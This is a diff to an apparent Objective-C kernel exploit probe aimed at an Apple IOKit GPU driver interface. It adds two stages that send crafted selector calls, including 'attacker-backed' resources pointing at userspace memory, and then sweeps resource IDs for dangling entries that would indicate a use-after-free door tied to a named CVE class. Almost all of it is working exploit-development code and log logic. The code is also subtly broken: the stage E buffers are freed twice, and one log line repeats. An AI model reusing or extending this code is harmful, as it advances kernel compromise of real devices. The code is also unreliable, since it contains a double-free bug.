@@ -259,16 +259,117 @@ static kern_return_t p120_fn4(IOConnectCallMethod_t call, p_ioconnect_t conn,
         }
         Lf(@"[*] stage-C: leftover deletions=%d (0 = no dangling insert this ladder)",
            leftover);
-        free(inBuf); free(outBuf);
+
+        /* ---------- Stage D: sel40 s_create_resource_iosurface ladder --------- */
+        /* v2 (2026-10-28, after the v1 device round: calibrate CARRIED
+           (gpuVA 0x1500000000 exactly as 23G71), resType-0x82 = 2c2
+           (validator), resType-0x80 = 2be (the Facet-A gate) — the size
+           was NOT the fail lever. Two new shapes:
+           D = sel40 (the IOSURFACE-resource creator, sIn 1 stOut 2) with
+               an oversized/over-big-dims IOSurface Sid — the door's
+               IOSurface-class arm per note 277 ("oversized-IOSurface-class").
+           E = the ATTACKER-BACKED newRes: resType 0 + flags with bit0xd=1
+               + addr = a real userspace buffer + size (the 23G71 decode:
+               "bit0xd=0 & addr==0 → kernel ORs 0x10063" — so bit0xd=1 +
+               addr≠0 is the NOT-defaulting path = the user-pages
+               backing arm (CVE-2025-24257's write class). */
+        L(@"");
+        L(@"--- Stage D: sel40 create_resource_iosurface oversized ladder ---");
+        L(@"[IN FLIGHT] stage-D ladder begins");
+        {
+            uint64_t sids[] = { 0, 1, 0xFFFFFFFF };
+            int n40 = 0;
+            for (int s = 0; s < (int)(sizeof sids / sizeof sids[0]); s++) {
+                uint64_t in = sids[s];
+                uint64_t o2[2] = { 0, 0 };
+                uint32_t ocnt = 2; size_t osz = 16;
+                kern_return_t kr = pCall(conn, 40, &in, 1, NULL, 0, o2, &ocnt, NULL, &osz);
+                Lf(@"[D] sel40 sid=0x%llx kr=0x%08x out={0x%llx,0x%llx}", in, kr, o2[0], o2[1]);
+                n40++;
+                if (kr == 0) {
+                    /* cleanup whatever id sel40 returned (out shape u32s) */
+                    uint32_t id2 = (uint32_t)(o2[0] & 0xffffffff) ?: (uint32_t)(o2[1] & 0xffffffff);
+                    if (id2) {
+                        kern_return_t dr = p120_del(pCall, conn, id2);
+                        Lf(@"[D]   delete id=%u kr=0x%08x", id2, dr);
+                    }
+                }
+            }
+            (void)n40;
+        }
+
+        /* ---------- Stage E: the ATTACKER-BACKED backing arm ---------- */
+        L(@"");
+        L(@"--- Stage E: attacker-backed newRes (flags bit0xd + userspace addr) ---");
+        L(@"[IN FLIGHT] stage-E ladder begins");
+        {
+            uint32_t sz = 0x8000;
+            void *upage = malloc(sz);
+            if (upage) {
+                memset(upage, 0x77, sz);
+                void *inBuf = malloc(P120_IN_SZ), *outBuf = malloc(P120_OUT_SZ);
+                uint64_t addrs[] = { (uint64_t)(uintptr_t)upage, 0 };
+                uint64_t sizes[] = { sz, 0x4000 };
+                uint32_t rtypes[] = { 0, 0x82 };
+                for (int t = 0; t < 2; t++) {
+                    for (int a = 0; a < 2; a++) {
+                        memset(inBuf, 0, P120_IN_SZ);
+                        *(uint32_t *)((uint8_t *)inBuf + 0x00) = rtypes[t];
+                        *(uint32_t *)((uint8_t *)inBuf + 0x04) = 0;      /* cache_mode */
+                        *(uint32_t *)((uint8_t *)inBuf + 0x14) = 0x2000; /* flags: bit0xd=1 */
+                        *(uint64_t *)((uint8_t *)inBuf + 0x18) = addrs[a];
+                        *(uint64_t *)((uint8_t *)inBuf + 0x48) = sizes[a];
+                        memset(outBuf, 0, P120_OUT_SZ);
+                        size_t osz = P120_OUT_SZ;
+                        uint32_t sc = 0;
+                        kern_return_t kr = pCall(conn, 8, NULL, 0, inBuf, P120_IN_SZ, NULL, &sc, outBuf, &osz);
+                        uint32_t id = *(uint32_t *)((uint8_t *)outBuf + 0x24);
+                        uint64_t gpuVA = *(uint64_t *)((uint8_t *)outBuf + 0x00);
+                        Lf(@"[E] resType=0x%02x addr=0x%llx size=0x%llx kr=0x%08x id=%u gpuVA=0x%llx",
+                           rtypes[t], addrs[a], sizes[a], kr, id, gpuVA);
+                        if (kr == 0 && id) {
+                            uint64_t h = 0;
+                            kern_return_t k4 = p120_fn4(pCall, conn, id, &h);
+                            Lf(@"[E]   fn4 id=%u kr=0x%08x handle=0x%llx (the user-backing gate)", id, k4, h);
+                            kern_return_t dr = p120_del(pCall, conn, id);
+                            Lf(@"[E]   delete id=%u kr=0x%08x", id, dr);
+                        } else if (kr != 0) {
+                            /* THE DOOR SHAPE on this arm: a FAIL that still
+                             * leaves the id registered — sweep the next id */
+                            for (int d2 = 1; d2 <= 4; d2++) {
+                                kern_return_t dr = p120_del(pCall, conn, id + d2);
+                                Lf(@"[E]   post-fail delete id=%u kr=0x%08x%s", id + d2, dr,
+                                   dr == 0 ? "  <<<< LEFTOVER RECEIPT" : "");
+                            }
+                        }
+                    }
+                }
+                free(inBuf); free(outBuf);
+                free(inBuf); free(outBuf);
+                /* overwrite the backing before free (no secrets) */
+                memset(upage, 0x00, sz); free(upage);
+            }
+        }
+
+        /* ---------- v1 device-law verdict notes (2026-10-28 round) ---------- */
+        L(@"");
+        L(@"[v1 round receipts] calibrate CARRIED on-device (sel8/9 kr=0,");
 
         L(@"");
-        L(@"=== VERDICT (honest) ===");
+        L(@"[v1 round receipts] calibrate CARRIED on-device (sel8/9 kr=0,");
+        L(@"  gpuVA 0x1500000000 = the 23G71 receipt verbatim); resType-0x82");
+        L(@"  ladder = 0xe00002c2 (entry validator), resType-0x80 = 0xe00002be");
+        L(@"  (the Facet-A gate) — size was NOT the fail lever; v2 shifts to");
+        L(@"  the sel40 IOSurface arm (stage D) + the attacker-backed backing");
+        L(@"  arm (stage E). The verdict classes below still hold:");
         L(@"- A SUCCESSFUL delete on an id the create never returned = the");
         L(@"  create-fail-after-INSERT receipt — the naked +0x90 getter makes");
         L(@"  that dangling entry raw-dereferencable on every fn4 walk. That");
         L(@"  pairing = the 64788 door on 23F77-class builds.");
         L(@"- fn4 handle reads on DELETED ids surviving = the registry keeps");
         L(@"  the UNRETAINED MD (note-277's leak law) — also a receipt class.");
+        L(@"- A gpuVA that reads THROUGH the userspace backing (0x77 bytes");
+        L(@"  visible in a later resource op) = the 24257-class backing door.");
         L(@"- Nothing above = HOLD; the door stays a map, not a receipt.");
         L(@"hasKread=NO. No claims beyond the receipts above.");
     }
